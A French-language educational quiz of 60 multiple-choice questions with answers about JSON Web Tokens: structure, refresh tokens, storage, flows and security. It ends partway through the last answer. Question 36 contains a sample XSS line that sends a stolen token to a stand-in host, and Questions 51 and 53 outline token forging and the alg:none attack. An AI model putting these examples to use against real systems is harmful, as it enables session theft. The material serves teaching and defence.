# Quiz Complet : JWT (JSON Web Tokens)

**Test de connaissances sur les JWT**

---

## Instructions

- 60 questions à choix multiples
- Cocher votre réponse puis cliquer pour voir la correction
- Score : 1 point par bonne réponse
- Temps recommandé : 45 minutes

---

## Section 1 : Concepts de Base (10 questions)

### Question 1 : Que signifie JWT ?

- [ ] **A)** Java Web Token
- [ ] **B)** JSON Web Token
- [ ] **C)** JavaScript Web Token
- [ ] **D)** JSON Web Transport

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) JSON Web Token**

JWT = JSON Web Token est un standard ouvert (RFC 7519) qui définit un moyen compact et autonome de transmettre de manière sécurisée des informations entre parties sous forme d'objet JSON.

</details>

---

### Question 2 : Combien de parties compose un JWT ?

- [ ] **A)** 2 parties
- [ ] **B)** 3 parties
- [ ] **C)** 4 parties
- [ ] **D)** Variable

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) 3 parties**

Un JWT est composé de trois parties séparées par des points :
1. Header (en-tête)
2. Payload (charge utile)
3. Signature

Format : `header.payload.signature`

</details>

---

### Question 3 : Quel séparateur entre les parties d'un JWT ?

- [ ] **A)** Virgule (,)
- [ ] **B)** Slash (/)
- [ ] **C)** Point (.)
- [ ] **D)** Tiret (-)

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : C) Point (.)**

Les trois parties sont séparées par des points.

Exemple : `eyJhbGci...` . `eyJ1c2VySWQ...` . `SflKxwRJ...`

</details>

---

### Question 4 : Le payload d'un JWT est encodé en quoi ?

- [ ] **A)** Base64
- [ ] **B)** Hexadécimal
- [ ] **C)** Encryption AES
- [ ] **D)** Plain text

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : A) Base64**

**Important** : Encodé ≠ Encrypté

Le payload est encodé en Base64, ce qui signifie que n'importe qui peut le décoder et lire son contenu. C'est pourquoi on ne doit JAMAIS mettre de données sensibles dans un JWT.

</details>

---

### Question 5 : Quelle information ne doit JAMAIS être dans un JWT ?

- [ ] **A)** User ID
- [ ] **B)** Password
- [ ] **C)** Email
- [ ] **D)** Role

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Password**

Les JWT sont décodables par n'importe qui. Ne jamais mettre :
- Passwords
- Numéros de carte crédit
- Secrets API
- Clés privées
- Toute donnée confidentielle

Mettre uniquement des informations non sensibles comme : user ID, email, role, permissions.

</details>

---

### Question 6 : À quoi sert la signature d'un JWT ?

- [ ] **A)** Encrypter le payload
- [ ] **B)** Vérifier que le token n'a pas été modifié
- [ ] **C)** Compresser le token
- [ ] **D)** Identifier l'utilisateur

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Vérifier que le token n'a pas été modifié**

La signature cryptographique garantit l'intégrité du token. Si un seul caractère du header ou du payload est modifié, la signature devient invalide et le serveur rejette le token.

La signature ne crypte PAS le payload (il reste lisible).

</details>

---

### Question 7 : Un JWT est-il encrypté par défaut ?

- [ ] **A)** Oui, toujours
- [ ] **B)** Non, il est encodé (lisible)
- [ ] **C)** Seulement le payload
- [ ] **D)** Selon l'algorithme

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Non, il est encodé (base64), pas encrypté**

Un JWT standard est encodé en base64, pas encrypté. N'importe qui peut :
- Aller sur jwt.io
- Coller le token
- Lire tout le contenu

Il existe JWE (JSON Web Encryption) pour encryption, mais ce n'est pas le JWT standard.

</details>

---

### Question 8 : Où le JWT est-il vérifié ?

- [ ] **A)** Côté client (browser)
- [ ] **B)** Côté serveur
- [ ] **C)** Dans la base de données
- [ ] **D)** Les deux

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Côté serveur**

Seul le serveur possède la clé secrète nécessaire pour vérifier la signature du token. Le client ne peut jamais vérifier l'authenticité d'un JWT car il n'a pas accès au secret.

</details>

---

### Question 9 : Quel avantage principal du JWT vs sessions classiques ?

- [ ] **A)** Plus rapide
- [ ] **B)** Serveur stateless (pas de stockage)
- [ ] **C)** Plus sécurisé
- [ ] **D)** Plus simple

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Serveur stateless**

Avec JWT, le serveur n'a pas besoin de stocker les sessions en mémoire ou en base de données. Toutes les informations nécessaires sont dans le token lui-même, ce qui facilite la scalabilité horizontale.

</details>

---

### Question 10 : JWT est un standard défini par quel RFC ?

- [ ] **A)** RFC 6749
- [ ] **B)** RFC 7519
- [ ] **C)** RFC 2616
- [ ] **D)** RFC 7230

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) RFC 7519**

JWT est standardisé dans le RFC 7519. Pour info :
- RFC 6749 = OAuth 2.0
- RFC 2616 = HTTP/1.1
- RFC 7230 = HTTP/1.1 Message Syntax

</details>

---

## Section 2 : Structure et Composants (10 questions)

### Question 11 : Que contient le Header d'un JWT ?

- [ ] **A)** User ID
- [ ] **B)** Algorithme de signature et type
- [ ] **C)** Password
- [ ] **D)** Date expiration

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Algorithme (alg) et Type (typ)**

Exemple de header :
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Le header indique quel algorithme est utilisé pour la signature (HS256, RS256, etc.) et que c'est un JWT.

</details>

---

### Question 12 : Quel claim indique la date d'expiration ?

- [ ] **A)** iat
- [ ] **B)** nbf
- [ ] **C)** exp
- [ ] **D)** exp_date

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : C) exp (expiration)**

Le claim `exp` contient un timestamp Unix en secondes indiquant quand le token expire.

Exemple : `"exp": 1699003600` = expire le 3 novembre 2023 à 10h

</details>

---

### Question 13 : Que signifie "iat" dans le payload ?

- [ ] **A)** Is Admin Token
- [ ] **B)** Issued At (date création)
- [ ] **C)** Invalid At
- [ ] **D)** Issuer Authentication

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Issued At (date de création)**

`iat` = Timestamp Unix en secondes indiquant quand le token a été créé.

Utile pour l'audit et pour calculer depuis combien de temps le token existe.

</details>

---

### Question 14 : Quel claim identifie l'utilisateur ?

- [ ] **A)** sub (subject)
- [ ] **B)** user
- [ ] **C)** id
- [ ] **D)** uid

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : A) sub (subject)**

`sub` est le claim standard pour identifier le sujet du token, généralement l'ID utilisateur unique.

Exemple : `"sub": "user-123"` ou `"sub": "auth0|507f1f77bcf86cd799439011"`

</details>

---

### Question 15 : HS256 est quel type d'algorithme ?

- [ ] **A)** Asymétrique
- [ ] **B)** Symétrique
- [ ] **C)** Hash seulement
- [ ] **D)** Encryption

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Symétrique (HMAC avec SHA-256)**

HS256 utilise la même clé secrète pour :
- Signer le token (serveur)
- Vérifier le token (serveur)

C'est un algorithme symétrique, ce qui signifie qu'on ne peut pas distribuer la clé publiquement.

</details>

---

### Question 16 : RS256 utilise quoi pour signer ?

- [ ] **A)** Secret partagé
- [ ] **B)** Clé privée
- [ ] **C)** Clé publique
- [ ] **D)** Password user

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Clé privée**

RS256 = RSA asymétrique :
- Signer avec clé privée (serveur seulement)
- Vérifier avec clé publique (n'importe qui)

Avantage : La clé publique peut être distribuée sans risque.

</details>

---

### Question 17 : Quelle taille minimum pour le secret HS256 ?

- [ ] **A)** 64 bits
- [ ] **B)** 128 bits
- [ ] **C)** 256 bits
- [ ] **D)** 512 bits

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : C) 256 bits minimum**

Un secret de 256 bits minimum est recommandé pour éviter :
- Brute force attacks
- JWT forging (création de faux tokens)

Générer avec : `crypto.randomBytes(32)` (32 bytes = 256 bits)

</details>

---

### Question 18 : Que contient le claim "aud" ?

- [ ] **A)** Audio file
- [ ] **B)** Audience (pour qui le token)
- [ ] **C)** Author
- [ ] **D)** Authentication date

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Audience (pour qui le token est destiné)**

`aud` identifie le destinataire prévu du token.

Exemple : `"aud": "https://api.myapp.com"` indique que ce token est destiné à l'API myapp.

</details>

---

### Question 19 : Un JWT peut-il être modifié sans invalider la signature ?

- [ ] **A)** Oui, facilement
- [ ] **B)** Oui, avec outils spéciaux
- [ ] **C)** Non, signature devient invalide
- [ ] **D)** Seulement le header

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : C) Non, signature devient invalide**

Tout changement dans le header ou le payload invalide immédiatement la signature. Le serveur rejettera le token modifié.

C'est le principe fondamental de sécurité du JWT.

</details>

---

### Question 20 : Format timestamp dans JWT ?

- [ ] **A)** Millisecondes
- [ ] **B)** Secondes (Unix timestamp)
- [ ] **C)** ISO 8601
- [ ] **D)** Date string

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Secondes (Unix timestamp)**

Les timestamps JWT (`exp`, `iat`, `nbf`) sont en secondes depuis 1970-01-01 (epoch Unix).

Exemple : `1699000000` = Vendredi 3 novembre 2023

**Attention** : JavaScript Date.now() retourne millisecondes, il faut diviser par 1000.

</details>

---

## Section 3 : Access et Refresh Tokens (10 questions)

### Question 21 : Durée de vie typique d'un access token ?

- [ ] **A)** 15 secondes
- [ ] **B)** 15 minutes à 1 heure
- [ ] **C)** 24 heures
- [ ] **D)** 7 jours

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) 15 minutes à 1 heure**

Court pour limiter l'exposition si le token est volé. Best practices :
- Web apps : 15-30 minutes
- Mobile apps : 1 heure (UX mobile)

</details>

---

### Question 22 : Pourquoi utiliser un refresh token ?

- [ ] **A)** Rafraîchir la page web
- [ ] **B)** Obtenir nouveau access token sans re-login
- [ ] **C)** Actualiser données utilisateur
- [ ] **D)** Supprimer cache browser

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Obtenir nouveau access token sans re-login**

Le refresh token permet de renouveler l'access token expiré sans que l'utilisateur ait à ressaisir ses identifiants toutes les 15 minutes.

Flow : Access expire → Client utilise refresh → Nouveau access token → Continue

</details>

---

### Question 23 : Durée de vie typique d'un refresh token ?

- [ ] **A)** 15 minutes
- [ ] **B)** 1 heure
- [ ] **C)** 7 à 30 jours
- [ ] **D)** Jamais n'expire

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : C) 7 à 30 jours**

Long pour une bonne UX (pas de re-login constant), mais pas infini pour la sécurité.

Valeurs courantes :
- Standard : 7 jours
- "Remember me" : 30 jours
- Apps critiques : 24 heures

</details>

---

### Question 24 : Que contient un refresh token comparé à l'access token ?

- [ ] **A)** Toutes infos user (identique à access)
- [ ] **B)** Juste user ID minimal
- [ ] **C)** Seulement email
- [ ] **D)** Rien du tout

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Juste user ID minimal**

Le refresh token contient le minimum d'informations (généralement juste l'user ID) car :
- Il vit plus longtemps (plus de risque si volé)
- Il sert uniquement à identifier l'user pour générer nouveau access
- Moins d'infos = moins de risque

</details>

---

### Question 25 : Le refresh token doit-il être stocké en database ?

- [ ] **A)** Non, jamais
- [ ] **B)** Oui, fortement recommandé
- [ ] **C)** Optionnel
- [ ] **D)** Seulement en production

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Oui, fortement recommandé**

Stocker les refresh tokens en DB permet :
- Révocation si token compromis
- Voir quels devices sont connectés
- Logout de tous devices
- Audit et sécurité

</details>

---

### Question 26 : Qu'est-ce que la rotation de refresh token ?

- [ ] **A)** Changer l'ordre des tokens
- [ ] **B)** Générer nouveau refresh à chaque utilisation
- [ ] **C)** Tourner le secret périodiquement
- [ ] **D)** Supprimer tokens anciens

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Générer nouveau refresh token à chaque utilisation**

Refresh token rotation (sécurité renforcée) :
1. Client utilise refresh token A
2. Serveur génère nouveau access + nouveau refresh B
3. Serveur invalide ancien refresh A
4. Client stocke nouveau refresh B

Avantage : Si refresh A volé et utilisé, détection possible (déjà invalidé).

</details>

---

### Question 27 : Si access token expiré, que fait le client ?

- [ ] **A)** Re-login immédiatement
- [ ] **B)** Utiliser refresh token pour obtenir nouveau access
- [ ] **C)** Attendre expiration refresh aussi
- [ ] **D)** Continuer avec token expiré

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Utiliser refresh token**

Flow automatique :
1. Client fait requête avec access expiré
2. Serveur retourne 401 "Token expired"
3. Client détecte erreur
4. Client appelle POST /api/refresh avec refresh token
5. Reçoit nouveau access token
6. Retry requête originale

L'utilisateur ne voit rien, c'est transparent.

</details>

---

### Question 28 : L'access token est-il facilement révocable ?

- [ ] **A)** Oui, dans database
- [ ] **B)** Non, stateless (expire naturellement)
- [ ] **C)** Oui, avec blacklist
- [ ] **D)** B et C

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : D) Non par nature (stateless), mais blacklist possible**

JWT stateless = Pas stocké en DB, donc pas révocable par défaut.

Solutions pour révocation :
- Attendre expiration (15 min max si bien configuré)
- Blacklist token (nécessite DB check à chaque requête, perd avantage stateless)
- Invalider refresh token (empêche renouvellement)

</details>

---

### Question 29 : Le refresh token est-il révocable ?

- [ ] **A)** Oui, si stocké en DB
- [ ] **B)** Non, jamais
- [ ] **C)** Seulement par l'utilisateur
- [ ] **D)** Automatiquement

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : A) Oui, si stocké en database**

Supprimer le refresh token de la DB = token invalide au prochain refresh.

Use cases :
- User clique "Logout"
- Admin suspend compte
- Détection activité suspecte
- Changement password

</details>

---

### Question 30 : Que faire si refresh token volé et détecté ?

- [ ] **A)** Ignorer
- [ ] **B)** Invalider ce refresh + forcer re-login
- [ ] **C)** Changer password utilisateur
- [ ] **D)** B et C

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : D) Invalider refresh + forcer re-login ET changer password recommandé**

Actions immédiates :
1. Invalider le refresh token compromis
2. Invalider TOUS refresh tokens de cet user (logout tous devices)
3. Forcer changement password
4. Notifier user de l'incident
5. Audit : comment token a été volé (XSS, phishing, etc.)

</details>

---

## Section 4 : Stockage (10 questions)

### Question 31 : localStorage persiste après fermeture browser ?

- [ ] **A)** Oui
- [ ] **B)** Non
- [ ] **C)** Selon configuration
- [ ] **D)** Seulement si "remember me"

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : A) Oui**

localStorage persiste toujours, même après :
- Fermeture onglet
- Fermeture browser
- Redémarrage ordinateur

Supprimé seulement par :
- `localStorage.clear()` explicite
- User vide cache browser
- Mode navigation privée (pas persisté)

</details>

---

### Question 32 : sessionStorage persiste après fermeture onglet ?

- [ ] **A)** Oui
- [ ] **B)** Non, supprimé à fermeture onglet
- [ ] **C)** Oui, mais pas browser complet
- [ ] **D)** Selon browser

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Non, supprimé à fermeture onglet**

sessionStorage = Durée de vie limitée à la session de l'onglet.

Supprimé quand :
- Fermeture de l'onglet
- Mais PAS au refresh page (F5)

Chaque onglet a son propre sessionStorage isolé.

</details>

---

### Question 33 : Cookie httpOnly est accessible via JavaScript ?

- [ ] **A)** Oui, avec document.cookie
- [ ] **B)** Non, pas accessible JavaScript
- [ ] **C)** Oui, avec getCookie()
- [ ] **D)** Selon configuration

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Non, pas accessible JavaScript**

C'est précisément le but de l'attribut `httpOnly` : empêcher JavaScript d'accéder au cookie.

Protection contre XSS : Même si attaquant injecte script malveillant, il ne peut pas voler le token.

```javascript
document.cookie // Ne montre PAS les cookies httpOnly
```

</details>

---

### Question 34 : Quelle capacité maximum de localStorage ?

- [ ] **A)** 4 KB
- [ ] **B)** 1 MB
- [ ] **C)** 5-10 MB (selon browser)
- [ ] **D)** Illimité

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : C) 5-10 MB (selon navigateur)**

Capacités par browser :
- Chrome : 10 MB
- Firefox : 10 MB
- Safari : 5 MB
- Edge : 10 MB

Largement suffisant pour tokens JWT (quelques KB).

</details>

---

### Question 35 : Quelle capacité maximum d'un cookie ?

- [ ] **A)** 4 KB
- [ ] **B)** 1 MB
- [ ] **C)** 5 MB
- [ ] **D)** Illimité

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : A) 4 KB**

Limitation stricte : 4 KB par cookie, 20-50 cookies par domaine.

Beaucoup plus limité que localStorage, mais largement suffisant pour JWT (1-2 KB typiquement).

</details>

---

### Question 36 : localStorage est vulnérable à quelle attaque ?

- [ ] **A)** SQL Injection
- [ ] **B)** XSS (Cross-Site Scripting)
- [ ] **C)** DDoS
- [ ] **D)** Phishing

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) XSS (Cross-Site Scripting)**

Si attaquant injecte script malveillant via XSS :
```javascript
// Script malveillant peut voler token
const token = localStorage.getItem('accessToken')
fetch('https://hacker.com/steal?token=' + token)
```

Protection : Cookie httpOnly (pas accessible JS) ou sanitization stricte inputs.

</details>

---

### Question 37 : Cookie httpOnly protège contre quelle attaque ?

- [ ] **A)** XSS
- [ ] **B)** CSRF
- [ ] **C)** SQL Injection
- [ ] **D)** Toutes les attaques

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : A) XSS**

`httpOnly` empêche JavaScript d'accéder au cookie, donc protection contre XSS.

MAIS : httpOnly ne protège PAS contre CSRF. Pour CSRF, utiliser `sameSite: 'strict'`.

</details>

---

### Question 38 : Attribut cookie pour protection CSRF ?

- [ ] **A)** httpOnly
- [ ] **B)** secure
- [ ] **C)** sameSite
- [ ] **D)** expires

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : C) sameSite**

`sameSite: 'strict'` empêche le browser d'envoyer le cookie dans requêtes cross-site.

Valeurs :
- `strict` : Jamais envoyé cross-site (max sécurité)
- `lax` : Envoyé seulement GET cross-site (bon compromis)
- `none` : Toujours envoyé (nécessite `secure: true`)

</details>

---

### Question 39 : Meilleur stockage pour access token (web app) ?

- [ ] **A)** localStorage
- [ ] **B)** sessionStorage  
- [ ] **C)** Cookie httpOnly
- [ ] **D)** Memory (state React)

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : C) Cookie httpOnly OU D) Memory**

**Cookie httpOnly** (recommandé) :
- Protection XSS
- Envoi automatique

**Memory/State** (encore mieux) :
- Disparu au refresh page
- Nécessite refresh token au chargement

**À éviter** : localStorage/sessionStorage (vulnérables XSS)

</details>

---

### Question 40 : Meilleur stockage pour refresh token ?

- [ ] **A)** localStorage
- [ ] **B)** sessionStorage
- [ ] **C)** Cookie httpOnly
- [ ] **D)** Ne pas stocker

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : C) Cookie httpOnly (idéal) OU A) localStorage (acceptable)**

**Cookie httpOnly** (mieux) :
- Protection XSS
- Plus sécurisé

**localStorage** (acceptable) :
- Plus flexible pour logique client refresh
- Nécessaire si pas de cookies (mobile)

**À éviter** : sessionStorage (perdu à fermeture onglet)

</details>

---

## Section 5 : Flow et Utilisation (10 questions)

### Question 41 : Après login réussi, combien de tokens le serveur retourne ?

- [ ] **A)** 1 token
- [ ] **B)** 2 tokens (access + refresh)
- [ ] **C)** 3 tokens
- [ ] **D)** Variable selon app

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) 2 tokens (access + refresh)**

Best practice moderne :
```json
{
  "accessToken": "eyJhbGci...",
  "refreshToken": "eyJhbGci...",
  "expiresIn": 900
}
```

</details>

---

### Question 42 : Comment envoyer JWT dans une requête HTTP ?

- [ ] **A)** Query parameter : `?token=...`
- [ ] **B)** Header Authorization : `Bearer <token>`
- [ ] **C)** Body JSON
- [ ] **D)** Cookie automatique

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Header Authorization avec préfixe Bearer**

Format standard :
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**À éviter** : Query parameter (token visible dans logs, historique browser)

</details>

---

### Question 43 : Que fait le serveur si access token expiré ?

- [ ] **A)** Retourne données quand même
- [ ] **B)** Retourne 401 Unauthorized
- [ ] **C)** Génère automatiquement nouveau token
- [ ] **D)** Crash serveur

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) 401 Unauthorized**

Réponse typique :
```json
{
  "error": "Token expired",
  "code": "TOKEN_EXPIRED"
}
```

Client doit alors utiliser refresh token ou forcer re-login.

</details>

---

### Question 44 : Endpoint typique pour renouveler access token ?

- [ ] **A)** POST /api/login
- [ ] **B)** POST /api/refresh
- [ ] **C)** GET /api/token
- [ ] **D)** POST /api/renew

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) POST /api/refresh**

Convention standard de nommage.

Request :
```json
POST /api/refresh
{
  "refreshToken": "eyJhbGci..."
}
```

Response :
```json
{
  "accessToken": "nouveau-token",
  "refreshToken": "nouveau-refresh",
  "expiresIn": 900
}
```

</details>

---

### Question 45 : Si refresh token expiré, que doit faire l'utilisateur ?

- [ ] **A)** Générer nouveau refresh
- [ ] **B)** User doit re-login
- [ ] **C)** Utiliser access token
- [ ] **D)** Continuer sans authentification

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) User doit re-login**

Refresh token expiré = Session terminée.

L'utilisateur doit ressaisir email/password pour obtenir nouveaux tokens.

C'est le comportement normal après 7-30 jours d'inactivité.

</details>

---

### Question 46 : JWT doit-il être transmis en HTTPS ?

- [ ] **A)** Non, encodé donc déjà sécurisé
- [ ] **B)** Oui, obligatoire
- [ ] **C)** Optionnel
- [ ] **D)** Seulement en production

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Oui, HTTPS obligatoire**

Sans HTTPS, le JWT peut être intercepté par attaque man-in-the-middle.

JWT encodé ≠ JWT encrypté. En HTTP, token lisible par intermédiaire réseau.

**HTTPS obligatoire** en production, toujours.

</details>

---

### Question 47 : Lors du logout, que doit faire le client ?

- [ ] **A)** Rien
- [ ] **B)** Supprimer tous tokens (localStorage.clear)
- [ ] **C)** Garder refresh token
- [ ] **D)** Expirer access token seulement

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Supprimer tous les tokens**

Actions client au logout :
```javascript
// Supprimer tokens
localStorage.removeItem('accessToken')
localStorage.removeItem('refreshToken')

// Ou tout clear
localStorage.clear()

// Clear cookies si utilisés
document.cookie = "accessToken=; expires=Thu, 01 Jan 1970"

// Rediriger login
router.push('/login')
```

</details>

---

### Question 48 : Lors du logout, que doit faire le serveur ?

- [ ] **A)** Rien (JWT stateless)
- [ ] **B)** Invalider refresh token en DB
- [ ] **C)** Blacklist access token
- [ ] **D)** B et C (idéal)

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : D) Invalider refresh + optionnellement blacklist access**

Actions serveur au logout :
```javascript
// Obligatoire
await db.refreshTokens.delete({ token: refreshToken })

// Optionnel (si sécurité critique)
await db.blacklistedTokens.create({ 
  token: accessToken,
  expiresAt: extractExp(accessToken)
})
```

</details>

---

### Question 49 : Peut-on décoder JWT sans avoir le secret ?

- [ ] **A)** Non, secret nécessaire pour décoder
- [ ] **B)** Oui, le payload est en base64
- [ ] **C)** Seulement le header
- [ ] **D)** Avec outils spéciaux seulement

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Oui, n'importe qui peut décoder (base64)**

Décoder JWT :
```javascript
// Sur jwt.io
// OU
const payload = JSON.parse(atob(token.split('.')[1]))
```

**MAIS** : On peut décoder (lire), pas VÉRIFIER (sans secret).

Vérification signature = Nécessite secret (serveur seulement).

</details>

---

### Question 50 : Peut-on modifier JWT et re-signer sans secret serveur ?

- [ ] **A)** Oui, facilement
- [ ] **B)** Oui, avec outils de hacking
- [ ] **C)** Non, secret nécessaire
- [ ] **D)** Seulement si admin

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : C) Non, impossible sans le secret**

C'est tout le principe de la signature cryptographique :
- Modifier payload : Facile (base64)
- Re-calculer signature valide : Impossible sans secret

Si secret compromis = Catastrophe (tous tokens forgables).

</details>

---

## Section 6 : Sécurité (10 questions bonus)

### Question 51 : Quelle attaque est possible si secret JWT trop simple ?

- [ ] **A)** XSS
- [ ] **B)** JWT forging (création de faux tokens)
- [ ] **C)** CSRF
- [ ] **D)** DDoS

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) JWT forging**

Secret faible (ex: "secret", "123456") peut être :
- Deviné par brute force
- Trouvé dans leaks GitHub

Attaquant peut alors créer tokens admin valides :
```python
import jwt
fake_token = jwt.encode({'userId': 1, 'role': 'admin'}, 'secret')
```

**Solution** : Secret 256 bits aléatoire.

</details>

---

### Question 52 : JWT protège-t-il contre XSS ?

- [ ] **A)** Oui, automatiquement
- [ ] **B)** Non, si localStorage vulnérable
- [ ] **C)** Seulement avec httpOnly
- [ ] **D)** B et C

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : D) Non si localStorage, Oui si httpOnly cookie**

JWT lui-même ne protège pas contre XSS. C'est le **stockage** qui importe :
- localStorage : Vulnérable XSS
- Cookie httpOnly : Protégé XSS

</details>

---

### Question 53 : L'algorithme "none" dans JWT est-il sécurisé ?

- [ ] **A)** Oui, sécurisé
- [ ] **B)** Non, très dangereux (pas de signature)
- [ ] **C)** Selon le contexte
- [ ] **D)** Oui si utilisé avec HTTPS

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Non, très dangereux**

`{"alg":"none"}` = Pas de signature du tout = Token modifiable par n'importe qui.

Attaque connue :
1. Prendre JWT valide
2. Changer `"alg":"HS256"` en `"alg":"none"`
3. Modifier payload (role: "admin")
4. Supprimer signature
5. Token "valide" sans vérification

**Toujours rejeter** tokens avec `alg: none`.

</details>

---

### Question 54 : Que faire si le secret JWT est compromis ?

- [ ] **A)** Ignorer
- [ ] **B)** Changer secret + invalider tous tokens
- [ ] **C)** Avertir users
- [ ] **D)** B et C

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : D) Changer secret immédiatement + invalider tous tokens + avertir users**

Actions d'urgence :
1. Générer nouveau secret fort
2. Deployer avec nouveau secret
3. Invalider TOUS refresh tokens en DB
4. Forcer re-login tous users
5. Notifier users de l'incident
6. Audit : Comment secret a fuité
7. Post-mortem : Éviter répétition

</details>

---

### Question 55 : JWT doit-il être loggé dans les logs serveur ?

- [ ] **A)** Oui, pour debug
- [ ] **B)** Non, jamais
- [ ] **C)** Seulement en développement
- [ ] **D)** Oui si anonymisé

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Non, jamais logger tokens complets**

Logs peuvent être :
- Exposés (leak, hack)
- Lus par équipe large
- Stockés longtemps

Logger seulement :
- User ID : OK
- Action : OK
- Token complet : NON

</details>

---

### Question 56 : Peut-on avoir plusieurs JWT actifs pour même utilisateur ?

- [ ] **A)** Non, 1 seul à la fois
- [ ] **B)** Oui (multi-devices)
- [ ] **C)** Maximum 2
- [ ] **D)** Interdit

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Oui (multi-devices)**

User peut être connecté simultanément sur :
- Phone
- Laptop
- Tablet
- Desktop travail

Chaque device a son propre pair access+refresh tokens.

Gérer via table `refresh_tokens` avec device_id.

</details>

---

### Question 57 : Comment implémenter "Remember Me" avec JWT ?

- [ ] **A)** Access token très long
- [ ] **B)** Refresh token très long (30 jours)
- [ ] **C)** Pas possible avec JWT
- [ ] **D)** Cookie permanent

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Refresh token longue durée**

Stratégie :
- Access token : Toujours court (15 min)
- Refresh token :
  - Remember me décoché : 7 jours
  - Remember me coché : 30 jours

```javascript
const refreshExp = rememberMe ? '30d' : '7d'
const refreshToken = jwt.sign(payload, secret, { expiresIn: refreshExp })
```

</details>

---

### Question 58 : JWT contient-il les données utilisateur les plus récentes ?

- [ ] **A)** Oui, toujours synchronisé
- [ ] **B)** Non, snapshot au moment de création
- [ ] **C)** Mise à jour automatique
- [ ] **D)** Selon configuration

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Non, snapshot au moment de création**

Scénario :
1. User login → Token avec `role: "user"`
2. Admin change role → `"admin"` dans DB
3. User fait requête → Token a encore `role: "user"`
4. Nouveau role effectif après refresh/re-login

**Implication** : Changements DB pas reflétés immédiatement dans JWT.

</details>

---

### Question 59 : Si user change password, ses JWT restent-ils valides ?

- [ ] **A)** Non, invalidés automatiquement
- [ ] **B)** Oui, jusqu'à expiration naturelle
- [ ] **C)** Seulement access token
- [ ] **D)** Selon configuration

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Oui, JWT stateless donc restent valides**

Problème de sécurité : Si password compromis et changé, ancien tokens fonctionnent encore.

**Solution** : Après changement password, invalider TOUS refresh tokens en DB.

```javascript
app.post('/change-password', async (req, res) => {
  // Changer password
  await db.users.update(userId, { password: newHash })
  
  // Invalider tous refresh tokens
  await db.refreshTokens.deleteAll({ userId })
  
  // Forcer re-login
})
```

</details>

---

### Question 60 : Faut-il vérifier la signature JWT côté client ?

- [ ] **A)** Oui, toujours
- [ ] **B)** Non, client n'a pas le secret
- [ ] **C)** Optionnel pour performance
- [ ] **D)** Seulement en production

<details>
<summary><strong>Voir la réponse</strong></summary>

**Réponse correcte : B) Non, client ne peut pas vérifier**

Client n'a pas (et ne doit jamais avoir) le secret.

Seul le serveur peut vérifier la signature.

Client peut :
- Décoder payload (lire infos)
